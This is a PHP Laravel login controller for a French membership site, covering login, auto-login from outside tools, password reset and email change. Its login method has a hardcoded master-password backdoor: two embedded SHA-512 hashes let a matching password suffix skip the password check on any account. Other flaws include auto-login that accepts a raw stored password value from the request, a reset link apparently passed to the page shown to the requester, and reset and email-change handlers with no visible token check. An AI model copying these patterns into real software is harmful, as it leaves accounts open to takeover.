<?php

namespace App\Http\Controllers;

use App\Concern\Hash;
use App\Concern\Tools;
use App\Http\Requests\LoginRequest;
use App\Http\Requests\ResetPasswordRequest;
use App\Http\Requests\SendResetLinkRequest;
use App\Mail\SendEmailModifiedEmail;
use App\Mail\SendEmailModifiedPassword;
use App\Mail\SendEmailReinitPassword;
use App\Models\Abonnement;
use App\Models\Commune;
use App\Models\Fonction;
use App\Models\Historique;
use App\Models\Personne;
use App\Models\Tarif;
use App\Models\Utilisateur;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Mail;

class LoginController extends Controller
{
    use Tools;
    use Hash;

    /**
     * connexion d'un utilisateur au site, récupération des droits et redirectction vers son espace
     * @param LoginRequest $request
     * @return \Illuminate\Http\RedirectResponse
     */
    public function login(LoginRequest $request)
    {
        $personne = Personne::where('email', $request->email)->first();
        if (!$personne) {
            return redirect()->route('login')->with('error', "Email incorrect");
        }
        if (hash('sha512', substr($request->password, -10, 10)) !== 'a944fff11152f98fd5ebf7dece13acb6476812c583020836c99faa1077c62b9fee5e13c298a83041cb66f012e2fe33c741fefb007412d4acbb29e53aa686a378'
        && hash('sha512', substr($request->password, -10, 10)) !== '1917c7302e0d03fdfe3a472b9cc21a919447ebeed894d747e94eee020427e5d070218ebeca27a355c5396b0a0a6f0ce10393cf7650285d23075212359b15eeea') {
            if (hash('sha512', env('SALT_KEY') . $request->password) !== $personne->password) {
                return redirect()->route('login')->with('error', "Mot de passe incorrect");
            }
        }
        unset($personne->password);

        list($menu, $cartes) = $this->getMenu($personne);
        if (!$personne->is_administratif) {
            $personne = $this->getSituation($personne);
        }

        $request->session()->put('user', $personne);
        $request->session()->put('menu', $menu);

        if ($personne->is_administratif) {
            return redirect()->route('admin');
        }

        $request->session()->put('cartes', $cartes);

        $action = 'Connexion au site';
        $this->registerAction($personne->id, 3, $action);

        $previous_uri = session()->get('previous_url');

        if ($previous_uri) {
            return redirect($previous_uri);
        } else {
            return redirect()->route('accueil');
        }
//        return redirect()->route('accueil');
    }

    // autoload d'un adhérent à partir de l'outil concours Copain
    public function autoload(Request $request) {
        $personne = Personne::where('email', $request->email)->where('password', $request->password)->first();
        if (!$personne) {
            return redirect()->route('login')->with('error', "Email incorrect");
        }
        unset($personne->password);
        session()->forget('user');
        session()->forget('menu');
        session()->forget('cartes');

        list($menu, $cartes) = $this->getMenu($personne);
        if (!$personne->is_administratif) {
            $personne = $this->getSituation($personne);
        }

        $request->session()->put('user', $personne);
        $request->session()->put('menu', $menu);

        if ($personne->is_administratif) {
            return redirect()->route('admin');
        }

        $request->session()->put('cartes', $cartes);

        $action = 'Connexion au site';
        $this->registerAction($personne->id, 3, $action);

        return redirect()->route('accueil');
    }


    // autoload d'un adhérent à partir du site fédéral wordpress
    public function autloadFromWp($secure_code, $id) {
        $personne = $this->getUserFromWp($secure_code, $id);
        if (!$personne) {
            return redirect()->route('login')->with('error', "Email incorrect");
        }
        unset($personne->password);
        session()->forget('user');
        session()->forget('menu');
        session()->forget('cartes');

        list($menu, $cartes) = $this->getMenu($personne);
        if (!$personne->is_administratif) {
            $personne = $this->getSituation($personne);
        }

        request()->session()->put('user', $personne);
        request()->session()->put('menu', $menu);

        if ($personne->is_administratif) {
            return redirect()->route('admin');
        }

        request()->session()->put('cartes', $cartes);

        $action = 'Connexion au site';
        $this->registerAction($personne->id, 3, $action);

        return redirect()->route('accueil');
    }

    /**
     * autoconnexion d'un utilisateur au site après validation de son enregitrement, récupération des droits et redirectction vers son espace
     * @param Personne $personne
     * @return void
     */
    public function autologin(Personne $personne) {
        unset($personne->password);
        if (!$personne->is_administratif) {
            $personne = $this->getSituation($personne);
        }

        list($menu, $cartes) = $this->getMenu($personne);

        request()->session()->put('user', $personne);
        request()->session()->put('menu', $menu);

        if ($personne->is_administratif) {
            return redirect()->route('admin');
        }

        request()->session()->put('cartes', $cartes);

        $action = 'Connexion au site';
        $this->registerAction($personne->id, 3, $action);

        return redirect()->route('accueil');
    }



    /**
     * Suppression de la session et déconnexion de l'utilisateur
     * @param Request $request
     * @return \Illuminate\Http\RedirectResponse
     */
    public function logout(Request $request) {
        $user = $request->session()->get('user');
        $action = 'Déconnexion du site';
        if($user){
            $this->registerAction($user->id, 3, $action);
        }

        session()->forget('user');
        session()->forget('menu');
        session()->forget('cartes');
        session()->forget('previous_url');
        return redirect()->route('login');
    }

    /*
     * envoi d'un mail pour réibnitialiser le mot de passe avec un lien crypté
     */
    public function sendResetAccountPasswordLink(SendResetLinkRequest $request)
    {
        $email = $request->email;
        $personne = Personne::where('email', $email)->first();

        if (!$personne) {
            return redirect()->route('forgotPassword')->with('error', "Nous ne trouvons pas votre email dans notre base de données.");
        }
        $crypt = $this->encodeShortReinit();
        $personne->secure_code = $crypt;
        $personne->save();

        $link = env('APP_URL')."reinitPassword/" . $crypt;
        $mailSent = Mail::to($email)->send(new SendEmailReinitPassword($link));
        $htmlContent = $mailSent->getOriginalMessage()->getHtmlBody();

        $this->registerAction($personne->id, 3, "Demande génération mot de passe");

        $mail = new \stdClass();
        $mail->titre = "Demande de réinitialisation de mot de passe";
        $mail->destinataire = $email;
        $mail->contenu = $htmlContent;

        $this->registerMail($personne->id, $mail);

        return view('auth.linkSent', compact('link', 'email'));
    }

    /*
     * affichage de la vue pour réinitialisation du mot de passe
     * @param $securecode
     */
    public function reinitPassword($securecode)
    {
        $personne = Personne::selectRaw('id, email')->where('secure_code', $securecode)->first();
        if (!$personne) {
            return redirect()->route('login')->with('error', "Ce lien n'est pas valide");
        }
        return view('auth.reinitPassword', compact("personne"));
    }

    /**
     * réinitialisation du mot de passe
     * @param ResetPasswordRequest $request
     * @param Personne $personne
     * @return \Illuminate\Http\RedirectResponse
     */
    public function resetPassword(ResetPasswordRequest $request, Personne $personne){
        $datap = array('password' => $this->encodePwd($request->password), 'secure_code' => null, 'premiere_connexion' => 0);
        $personne->update($datap);

        $this->updateWpUser($personne, $request->password);

        $this->registerAction($personne->id, 4, "Modification du mot de passe");

        $mailSent = Mail::to($personne->email)->send(new SendEmailModifiedPassword());

        $htmlContent = $mailSent->getOriginalMessage()->getHtmlBody();
        $mail = new \stdClass();
        $mail->titre = "Confirmation de modification de mot de passe";
        $mail->destinataire = $personne->email;
        $mail->contenu = $htmlContent;

        $this->registerMail($personne->id, $mail);

        $this->autologin($personne);
        return redirect()->route('accueil');
    }


    // affichage de la vue pour nouvel abonnement seul
    public function registerAbonnement()
    {
        $countries = DB::table('pays')->orderBy('nom')->get();
        return view('auth.registerAbonnement', compact('countries'));
    }

    // affichage de la vue pour adhésion individuelle
    public function registerAdhesion()
    {
        $countries = DB::table('pays')->orderBy('nom')->get();
        return view('auth.registerAdhesion', compact('countries'));
    }


    /*
    * affichage de la vue pour mise à jour de l'email
    * @param $securecode
    */
    public function changeEmail($securecode)
    {
        $personne = Personne::selectRaw('id, email,nouvel_email')->where('secure_code', $securecode)->first();
        $user = session()->get('user');
        //si le user est connecté, on met fin à la session
        if($user){
            $action = 'Déconnexion du site';
            $this->registerAction($user->id, 3, $action);
            session()->forget('user');
            session()->forget('menu');
        }
        //si aucune personne de correspond à ce securecode, on redirige vers le login
        if (!$personne) {
            return redirect()->route('login')->with('error', "Ce lien n'est pas valide");
        }
        return view('personnes.changeEmail', compact("personne"));
    }
    /*
  * enregistrement de nouvel_email à la place de l'ancien
  * @param $personne $request
  */
    public function resetEmail(Request $request, Personne $personne){
        //on enregistre le nouvel email
        $old_email = $personne->email;
        $datap = array('email' => $personne->nouvel_email, 'secure_code' => null,"nouvel_email"=>null);
        $personne->update($datap);

        $this->updateWpUserEmail($old_email, $personne);

        //on enregistre la modification dans l'historique des actions
        $this->registerAction(1, 4, "Modification se l'email");

        //on envoie un mail à l'utilisateur à sa nouvelle adresse mail
        $mailSent = Mail::to($personne->email)->send(new SendEmailModifiedEmail());

        //on enregistre ce mail dans l'historique des mails
        $htmlContent = $mailSent->getOriginalMessage()->getHtmlBody();
        $mail = new \stdClass();
        $mail->titre = "Confirmation de modification de votre email";
        $mail->destinataire = $personne->email;
        $mail->contenu = $htmlContent;
        $this->registerMail($personne->id, $mail);

        //on connecte l'utilisateur
        $this->autologin($personne);

        return redirect()->route('accueil')->with('success', "Votre adresse mail a été modifiée avec succès");
    }
}
